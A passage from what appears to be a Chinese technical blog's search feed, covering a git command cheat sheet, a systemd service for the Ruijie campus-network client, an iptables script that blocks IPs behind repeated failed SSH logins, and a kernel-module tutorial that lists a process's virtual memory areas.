[url]</span><br></pre></td></tr></tbody></table></figure><h3 id="添加文件到缓存区"><a href="#添加文件到缓存区" class="headerlink" title="添加文件到缓存区"></a><strong>添加文件到缓存区</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加所有变化的文件</span><br></pre></td></tr></tbody></table></figure><p>git add .</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">添加名称指定文件</span><br><span class="line">git add text.txt</span><br></pre></td></tr></tbody></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a><strong>配置</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">设置提交代码时的用户信息</span><br><span class="line">git config [--global] user.name "[name]"</span><br><span class="line">git config [--global] user.email "[email address]"</span><br></pre></td></tr></tbody></table></figure><h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a><strong>提交</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">提交暂存区到仓库区</span><br><span class="line">git commit -m "msg"</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></tbody></table></figure><h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a><strong>远程同步</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 下载远程仓库的所有变动</span><br><span class="line">$ git fetch [remote]</span><br><span class="line"></span><br><span class="line"># 显示所有远程仓库</span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"># 显示某个远程仓库的信息</span><br><span class="line">$ git remote show [remote]</span><br><span class="line"></span><br><span class="line"># 增加一个新的远程仓库，并命名</span><br><span class="line">$ git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的变化，并与本地分支合并</span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 上传本地指定分支到远程仓库</span><br><span class="line">$ git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">$ git push [remote] --force</span><br><span class="line"></span><br><span class="line"># 推送所有分支到远程仓库</span><br><span class="line">$ git push [remote] --all</span><br></pre></td></tr></tbody></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a><strong>分支</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 列出所有本地分支</span><br><span class="line">$ git branch</span><br><span class="line"></span><br><span class="line"># 列出所有远程分支</span><br><span class="line">$ git branch -r</span><br><span class="line"></span><br><span class="line"># 列出所有本地分支和远程分支</span><br><span class="line">$ git branch -a</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">$ git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 切换到上一个分支</span><br><span class="line">$ git checkout -</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"># 删除分支</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></tbody></table></figure><h3 id="标签Tags"><a href="#标签Tags" class="headerlink" title="标签Tags"></a><strong>标签Tags</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">添加标签 在当前commit</span><br><span class="line">git tag -a v1.0 -m 'xxx' </span><br><span class="line"></span><br><span class="line">添加标签 在指定commit</span><br><span class="line">git tag v1.0 [commit]</span><br><span class="line"></span><br><span class="line">查看</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">git tag -d V1.0</span><br><span class="line"></span><br><span class="line">删除远程tag</span><br><span class="line">git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line">推送</span><br><span class="line">git push origin --tags</span><br><span class="line"></span><br><span class="line">拉取</span><br><span class="line">git fetch origin tag V1.0</span><br><span class="line"></span><br><span class="line">新建一个分支，指向某个tag</span><br><span class="line">git checkout -b [branch] [tag]</span><br></pre></td></tr></tbody></table></figure><h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a><strong>查看信息</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># 显示有变更的文件</span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"># 显示当前分支的版本历史</span><br><span class="line">$ git log</span><br><span class="line"></span><br><span class="line"># 显示commit历史，以及每次commit发生变更的文件</span><br><span class="line">$ git log --stat</span><br><span class="line"></span><br><span class="line"># 搜索提交历史，根据关键词</span><br><span class="line">$ git log -S [keyword]</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，每个commit占据一行</span><br><span class="line">$ git log [tag] HEAD --pretty=format:%s</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</span><br><span class="line">$ git log [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"># 显示某个文件的版本历史，包括文件改名</span><br><span class="line">$ git log --follow [file]</span><br><span class="line">$ git whatchanged [file]</span><br><span class="line"></span><br><span class="line"># 显示指定文件相关的每一次diff</span><br><span class="line">$ git log -p [file]</span><br><span class="line"></span><br><span class="line"># 显示过去5次提交</span><br><span class="line">$ git log -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"># 显示所有提交过的用户，按提交次数排序</span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 显示指定文件是什么人在什么时间修改过</span><br><span class="line">$ git blame [file]</span><br><span class="line"></span><br><span class="line"># 显示暂存区和工作区的差异</span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"># 显示暂存区和上一个commit的差异</span><br><span class="line">$ git diff --cached [file]</span><br><span class="line"></span><br><span class="line"># 显示工作区与当前分支最新commit之间的差异</span><br><span class="line">$ git diff HEAD</span><br><span class="line"></span><br><span class="line"># 显示两次提交之间的差异</span><br><span class="line">$ git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"># 显示今天你写了多少行代码</span><br><span class="line">$ git diff --shortstat "@{0 day ago}"</span><br><span class="line"></span><br><span class="line"># 显示某次提交的元数据和内容变化</span><br><span class="line">$ git show [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交发生变化的文件</span><br><span class="line">$ git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交时，某个文件的内容</span><br><span class="line">$ git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"># 显示当前分支的最近几次提交</span><br><span class="line">$ git reflog</span><br></pre></td></tr></tbody></table></figure><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a><strong>撤销</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复某个commit的指定文件到暂存区和工作区</span><br><span class="line">$ git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span><br><span class="line">$ git reset [file]</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span><br><span class="line">$ git reset [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span><br><span class="line">$ git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span><br><span class="line">$ git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个commit，用来撤销指定commit</span><br><span class="line"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span><br><span class="line">$ git revert [commit]</span><br><span class="line"></span><br><span class="line"># 暂时将未提交的变化移除，稍后再移入</span><br><span class="line">$ git stash</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></tbody></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成一个可供发布的压缩包</span><br><span class="line">$ git archives</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 下将校园网客户端锐捷制作成服务并开机启动</title>
      <link href="/posts/37686/"/>
      <url>/posts/37686/</url>
      
        <content type="html"><![CDATA[<p>1.下载锐捷，解压后给rjsupplicant.sh 添加可执行权限</p><p>2.创建一个 systemd 启动脚本并将其放在 <code>/etc/systemd/system/</code> 目录中，内容如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ruijie.service</span></span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Run ruijie</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/home/rjsupplicant/rjsupplicant.sh  -u stuxxxx -p passwordxxxx -d 0 </span><br><span class="line">ExecStop=/home/rjsupplicant/rjsupplicant.sh -q</span><br><span class="line">ExecReload=/home/rjsupplicant/rjsupplicant.sh -u stuxxxx -p passwordxxxx -d 0</span><br><span class="line">Restart=on-failure</span><br><span class="line">KillMode=control-group</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>3.运行以下命令启动服务</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> ruijie.service</span><br><span class="line">systemctl start  ruijie <span class="comment">#启动锐捷</span></span><br><span class="line">systemctl status ruijie <span class="comment">#查看锐捷状态</span></span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/37686/image-20250810002421258-4756666.png" alt="image-20250810002421258"></p><p>4.重启检查是否启动</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br><span class="line">ps aux|grep rjsupplicant</span><br><span class="line">ping www.baidu.com</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单抵御疑似黑客的ssh登录</title>
      <link href="/posts/5423/"/>
      <url>/posts/5423/</url>
      
        <content type="html"><![CDATA[<p>屏蔽每分钟ssh尝试登陆linux服务器 超过10次的IP进行屏蔽:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">DATE=$(<span class="built_in">date</span> +<span class="string">"%a %b %e %H:%M"</span>) <span class="comment">#星期月天时分 %e单数字时显示7，而%d显示07</span></span><br><span class="line">ABNORMAL_IP=$(lastb |grep <span class="string">"<span class="variable">$DATE</span>"</span> |awk <span class="string">'{a[$3]++}END{for(i in</span></span><br><span class="line"><span class="string">a)if(a[i]&gt;10)print i}'</span>)</span><br><span class="line"><span class="keyword">for</span> IP <span class="keyword">in</span> <span class="variable">$ABNORMAL_IP</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ $(iptables -vnL |grep -c <span class="string">"<span class="variable">$IP</span>"</span>) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        iptables -I INPUT -s <span class="variable">$IP</span> -j DROP</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内存管理</title>
      <link href="/posts/53930/"/>
      <url>/posts/53930/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：</p><p>在 32 位的系统上，线性地址空间为 4GB，其中用户进程占有 3GB 线性地址空间，内核占有 1GB 线性地址空间。由于虚拟内存的引入，使的每个进程都可拥有 3GB 的虚拟内存。</p><p>用户进程的虚拟地址空间包含若干区域，这些区域的分布方式因体系结构的差异而不同，但所有的方式都包含下列成分：</p><p>（1） 代码段：可执行文件的二进制代码</p><p>（2） 数据段：存储全局变量</p><p>（3） 栈：用于保存局部变量和实现函数调用</p><p>（4） 环境变量和命令行参数</p><p>（5） 程序使用的动态库的代码</p><p>（6） 用于映射文件内容的区域为便于描述，系统中进程的虚拟内存空间被划分为若干不同的区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在 Linux 内核中，这样的区域被称为虚拟内存区域(virtual memory areas，VMA)。一个 VMA 是一块连续的线性地址空间的抽象，它拥有自身的权限(可读，可写，可执行等) ，对进程而言，VMA 其实是虚拟空间的内存块，一个进程的所有资源由多个内存块组成。</p><p>每一个虚拟内存区域都由一个相关的 struct vm_area_struct 结构来描述。</p><p>本文将编写一个内核模块，遍历一个用户进程中所有的 VMA，并且打印这些 VMA 的属性信息，如 VMA 的大小、起始地址等，并通过与“/proc/pid/maps”中显示的信息进行对比验证 VMA 信息是否正确。  </p></blockquote><ol><li><h5 id="编写模块程序"><a href="#编写模块程序" class="headerlink" title="编写模块程序"></a>编写模块程序</h5><p>参考代码如下，代码文件命名为“vma_test.c”</p></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vma_test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pid;</span><br><span class="line">module_param(pid, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printit</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">  <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> start, end, length;</span><br><span class="line"></span><br><span class="line">  mm = tsk-&gt;mm;</span><br><span class="line">  pr_info(<span class="string">"mm_struct addr = 0x%p\n"</span>, mm);</span><br><span class="line">  vma = mm-&gt;mmap;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 mmap_sem 读写信号量进行保护 */</span></span><br><span class="line">  down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">  pr_info(<span class="string">"vmas: vma start end length\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (vma) {</span><br><span class="line">      j++;</span><br><span class="line">      start = vma-&gt;vm_start;</span><br><span class="line">      end = vma-&gt;vm_end;</span><br><span class="line">      length = end - start;</span><br><span class="line">      pr_info(<span class="string">"%6d: %16p %12lx %12lx %8ld\n"</span>,</span><br><span class="line">          j, vma, start, end, length);</span><br><span class="line">      vma = vma-&gt;vm_next;</span><br><span class="line">  }</span><br><span class="line">  up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vma_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">  <span class="comment">/* 如果插入模块时未定义 pid 号，则使用当前 pid */</span></span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">      tsk = current;</span><br><span class="line">      pid = current-&gt;pid;</span><br><span class="line">      pr_info(<span class="string">"using current process\n"</span>);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">      tsk = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!tsk)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pr_info(<span class="string">" Examining vma's for pid=%d, command=%s\n"</span>, pid, tsk-&gt;comm);</span><br><span class="line">  printit(tsk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vma_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  pr_info(<span class="string">"Module exit\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(vma_init);</span><br><span class="line">module_exit(vma_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Yu"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"vma test"</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码中:</p><p>38-52 行是内核模块初始化函数 vma_init；</p><p>40-46 行目的是获取 pid，可在加载模块时可传递相关参数（即进程 pid）；如果没有传递参数，则使用当前进程，即执行 insmod 命令的进程；</p><p>45 行 pid_task()函数为获取任务的任务描述符信息，其返回值是 struct task_struct 结构体类型的变量；</p><p>50 行调用自定义的 printit()函数打印相关信息；</p><p>9-34 行是本实验核心函数；</p><p>16 行获取待检查进程的内存描述符 struct mm_struct 数据结构，该结构由struct task_struct 中的*mm 指向；</p><p>18 行获取 VMA 链表头，即 mm-&gt;mmap；</p><p>21 行开始遍历 VMA 链表,down_read()函数用于申请读信号量，因本程序只是读取 VMA 链表，所以申请读者类型即可，若需丢 VMA 链表进行修改，则需申请写者类型信号量；  </p><p>24-32 行遍历 VMA 链表，并对每个 VMA 打印其起始地址、终止地址和长度信<br>息；</p><p>33 行释放读者信号量。</p></blockquote><ol start="2"><li><h5 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h5><p>编写 Makefile 文件，文件名必须为“Makefile”  </p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m := vma_test.o</span><br><span class="line"></span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></tbody></table></figure></li><li><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>使用 make 命令编译即可。  </p></li><li><h5 id="插入模块"><a href="#插入模块" class="headerlink" title="插入模块"></a>插入模块</h5><p>先通过 top 命令查看进程，任意获取一个进程 pid，如图所示，  本例中获取apache2 进程的 pid 3509。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/53930/image-20200608163648953.png" alt="image-20200608163648953"></p><p>使 用 insmod 插 入 模 块 ， 并 传 参 。 如 图 所 示 ， 本 例 中 模 块 名 为“vma_test.ko”,pid 为 3509，则插入模块命令为：  </p></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod vma_test.ko pid=3509</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li><h5 id="查看程序打印信息"><a href="#查看程序打印信息" class="headerlink" title="查看程序打印信息"></a>查看程序打印信息</h5><p>通过 dmesg 命令查看 VMA 信息。如下图所示:</p></li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/53930/image-20200608164250039.png" alt="image-20200608164250039"></p><blockquote><p>从上图可看到 apache2 进程包含许多 VMA 区域，以第一个 VMA 